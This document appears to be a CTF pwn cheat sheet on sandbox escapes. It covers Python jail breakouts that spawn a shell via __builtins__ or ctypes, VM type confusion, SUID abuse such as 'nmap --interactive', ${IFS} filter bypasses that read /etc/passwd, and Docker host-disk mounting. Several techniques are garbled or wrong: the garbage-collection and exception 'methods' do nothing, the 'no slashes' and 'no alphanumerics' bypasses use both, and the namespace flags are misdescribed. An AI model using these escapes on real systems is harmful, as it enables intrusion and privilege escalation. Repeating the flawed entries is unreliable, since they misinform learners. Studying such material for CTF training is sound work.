# CTF Pwn - Sandbox Escape

## Python Jail Escape

### Method 1: _builtins__ Exfiltration
```python
# Python jail — no modules, no builtins except __builtins__
__builtins__  # dict with builtins
__builtins__.__dict__['eval']  # eval()
__builtins__['__import__']('os').system('sh')
```

### Method 2: ctypes to libc
```python
import ctypes
libc = ctypes.CDLL('libc.so.6')
libc.system('sh')
```

### Method 3: File Read via open()
```python
# Read flag file
open('/flag').read()
```

### Method 4: Garbage Collection to Import
```python
# Force garbage collection → import cycle → side effect
import gc
gc.collect()  # side effect: modules become accessible
```

### Method 5: Exception Trampoline
```python
# In Python 3, exceptions have __context__
# Leak via exception chain
raise ValueError()
```

---

## Custom VM / Interpreter Escape

### Pattern: OOB Read in VM State
VM with internal state (registers, stack) that exceeds bounds. Leak VM state to find libc pointers or code addresses.

```python
# VM opcodes — overflow into host memory
# Leaks host heap/libc pointers in VM state dump
send(opcodes_that_trigger_dump)
```

### Pattern: Type Confusion
```c
// VM: union type, same bytes interpreted as int vs pointer
union Value { int type; void *ptr; };
// Write: type = INTEGER; value controlled
// Read: type = POINTER; value used as pointer → arbitrary read
```

---

## FUSE / CUSE Exploitation

### FUSE (Filesystem in Userspace)
```c
// FUSE server runs as root
// Accessible via: mount -t fuse device /mnt/fuse
// Operations: read, write, ioctl, etc.

// Exploit: ioctl handler has kernel pointer leak
// Overwrite with shellcode
```

### CUSE (Character Device in Userspace)
Similar to FUSE but for character devices.

---

## Busybox Shell Tricks

### Environment Variable Injection
```bash
# PATH manipulation
PATH=/home/ctf:$PATH
# LD_PRELOAD injection
LD_PRELOAD=/home/ctf/libc.so.6
```

### SUID Binary Tricks
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# SUID with known vuln: nmap
nmap --interactive
!sh

# env manipulation
env -i /bin/sh
```

---

## Shell Restrictions Bypass

### No Spaces
```bash
# Use ${IFS} or $' ' instead
cat${IFS}/etc/passwd
```

### No Slashes
```bash
# Use variable substitution
$(echo${IFS}//bin/cat${IFS}/etc/passwd)
```

### No Alphanumerics
```bash
# Use bash $'...' hex encoding
/$'\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x62\\x61\\x73\\x68'
```

---

## Container/Escaped Context

### Docker Container Escape
```bash
# Mount host filesystem
mount /dev/sda1 /mnt
# Or via cgroups
mkdir /tmp/cgroup && mount cgroup /tmp/cgroup -t cgroup2
```

### Seccomp Unshare
```bash
# seccomp blocks syscall → unshare into new namespace
unshare -Urm  # user namespace + mount + PID
# New namespace may have fewer restrictions
```

---

## Common Escape Primitives

| Primitive | Scenario | Method |
|-----------|----------|--------|
| Arbitrary read | Python jail | `open('/proc/self/mem').read()` |
| Arbitrary write | Python jail | `import ctypes; ctypes.memmove()` |
| Command execution | Python jail | `__builtins__.__dict__['__import__']('os').system()` |
| Memory leak | VM interpreter | OOB read in VM state |
| Type confusion | Typed VM | Union same bytes, different interpretation |
| Kernel module | Kernel CTF | modprobe_path overwrite |
| UAF | Kernel driver | tty_struct kROP |
